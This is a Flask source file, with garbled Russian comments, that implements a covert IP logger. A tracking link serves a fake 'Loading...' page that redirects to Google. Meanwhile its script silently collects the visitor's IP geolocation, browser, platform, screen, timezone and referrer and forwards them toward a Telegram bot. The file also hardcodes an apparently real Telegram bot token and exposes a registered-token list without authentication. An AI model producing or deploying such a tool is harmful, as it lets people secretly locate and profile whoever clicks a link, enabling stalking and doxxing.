from flask import Flask, request, render_template_string
import requests
import os
import json

app = Flask(__name__)

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = '8227214382:AAE7l5mNa6vkCywtLWpW_LWLAuBKGwcoc-U'
TELEGRAM_API_URL = f'https://api.telegram.org/bot{BOT_TOKEN}'

# –•—Ä–∞–Ω–∏–ª–∏—â–µ —Ç–æ–∫–µ–Ω–æ–≤ (–≤ –ø—Ä–æ–¥–∞–∫—à–Ω –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ë–î)
user_tokens = {}

# HTML –¥–ª—è IP –ª–æ–≥–≥–µ—Ä–∞ —Å —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ–º
IP_LOGGER_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <meta http-equiv="refresh" content="0; url=https://www.google.com">
    <style>
        body {
            background: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h3>üîÑ –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...</h3>
        <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ</p>
    </div>
    
    <script>
        // –°–æ–±–∏—Ä–∞–µ–º –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function collectAndSendData() {
            try {
                const token = window.location.pathname.split('/i/')[1];
                
                // –ü–æ–ª—É—á–∞–µ–º IP –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                // –°–æ–±–∏—Ä–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const userData = {
                    token: token,
                    ip_info: ipData,
                    user_agent: navigator.userAgent,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    cookie_enabled: navigator.cookieEnabled,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        color_depth: screen.colorDepth
                    },
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer
                };
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä
                await fetch('/log_ip', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(userData)
                });
                
            } catch (error) {
                console.log('Data collection completed');
            }
        }
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        collectAndSendData();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "üü¢ IP Logger Server Active - ILoveYouSo"

@app.route('/i/<token>')
def ip_logger_page(token):
    """–°—Ç—Ä–∞–Ω–∏—Ü–∞ IP –ª–æ–≥–≥–µ—Ä–∞"""
    print(f"üîó –ü–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ —Å —Ç–æ–∫–µ–Ω–æ–º: {token}")
    return render_template_string(IP_LOGGER_HTML)

@app.route('/log_ip', methods=['POST'])
def log_ip():
    """–ü—Ä–∏—ë–º –∏ –æ–±—Ä–∞–±–æ—Ç–∫–∞ IP –¥–∞–Ω–Ω—ã—Ö"""
    try:
        data = request.json
        token = data.get('token')
        ip_info = data.get('ip_info', {})
        
        print(f"üì® –ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –¥–ª—è —Ç–æ–∫–µ–Ω–∞: {token}")
        print(f"üåê IP: {ip_info.get('ip', 'Unknown')}")
        print(f"üèôÔ∏è –ì–æ—Ä–æ–¥: {ip_info.get('city', 'Unknown')}")
        print(f"üåç –°—Ç—Ä–∞–Ω–∞: {ip_info.get('country_name', 'Unknown')}")
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
        message = format_telegram_message(data)
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram (–µ—Å–ª–∏ –∏–∑–≤–µ—Å—Ç–µ–Ω chat_id)
        # –í —Ä–µ–∞–ª—å–Ω–æ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏ –Ω—É–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å —Å–≤—è–∑—å token -> chat_id
        send_to_telegram(message)
        
        return {'status': 'success', 'message': 'Data logged'}, 200
        
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        return {'status': 'error', 'message': str(e)}, 500

def format_telegram_message(data):
    """–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è Telegram"""
    ip_info = data.get('ip_info', {})
    
    message = (
        "üåê *–ù–û–í–´–ô –ü–ï–†–ï–•–û–î –ü–û IP-–õ–û–ì–ì–ï–†–£!*\n\n"
        f"üîë *–¢–æ–∫–µ–Ω:* `{data.get('token', 'Unknown')}`\n"
        f"üìç *IP:* `{ip_info.get('ip', 'Unknown')}`\n"
        f"üèôÔ∏è *–ì–æ—Ä–æ–¥:* {ip_info.get('city', 'Unknown')}\n"
        f"üè≥Ô∏è *–†–µ–≥–∏–æ–Ω:* {ip_info.get('region', 'Unknown')}\n"
        f"üåç *–°—Ç—Ä–∞–Ω–∞:* {ip_info.get('country_name', 'Unknown')}\n"
        f"üè¢ *–ü—Ä–æ–≤–∞–π–¥–µ—Ä:* {ip_info.get('org', 'Unknown')}\n"
        f"üïê *–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å:* {ip_info.get('timezone', 'Unknown')}\n"
        f"üíª *–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞:* {data.get('platform', 'Unknown')}\n"
        f"üåê *–Ø–∑—ã–∫:* {data.get('language', 'Unknown')}\n"
        f"üì± *User Agent:* {data.get('user_agent', 'Unknown')[:100]}...\n"
        f"üñ•Ô∏è *–≠–∫—Ä–∞–Ω:* {data.get('screen', {}).get('width', 'Unknown')}x{data.get('screen', {}).get('height', 'Unknown')}\n"
        f"üîó *–†–µ—Ñ–µ—Ä–µ—Ä:* {data.get('referrer', 'Unknown')}"
    )
    
    return message

def send_to_telegram(message, chat_id=None):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram"""
    try:
        # –ï—Å–ª–∏ chat_id –Ω–µ —É–∫–∞–∑–∞–Ω, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ –ª–æ–≥–∏
        if not chat_id:
            print("üì§ –°–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram:")
            print(message)
            return
        
        url = f"{TELEGRAM_API_URL}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print("‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram")
        else:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {response.text}")
            
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")

# API –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Ç–æ–∫–µ–Ω–æ–≤
@app.route('/register_token', methods=['POST'])
def register_token():
    """–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —Ç–æ–∫–µ–Ω–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        data = request.json
        token = data.get('token')
        chat_id = data.get('chat_id')
        
        if token and chat_id:
            user_tokens[token] = chat_id
            print(f"‚úÖ –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω —Ç–æ–∫–µ–Ω {token} –¥–ª—è chat_id {chat_id}")
            return {'status': 'success'}, 200
        else:
            return {'status': 'error', 'message': 'Missing token or chat_id'}, 400
            
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —Ç–æ–∫–µ–Ω–∞: {e}")
        return {'status': 'error', 'message': str(e)}, 500

@app.route('/tokens', methods=['GET'])
def list_tokens():
    """–°–ø–∏—Å–æ–∫ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ (–¥–ª—è –æ—Ç–ª–∞–¥–∫–∏)"""
    return {'tokens': user_tokens}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"üöÄ –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞ –Ω–∞ –ø–æ—Ä—Ç—É {port}")
    print(f"üîó IP-–ª–æ–≥–≥–µ—Ä –¥–æ—Å—Ç—É–ø–µ–Ω –ø–æ: http://localhost:{port}/i/YOUR_TOKEN")
    app.run(host='0.0.0.0', port=port)
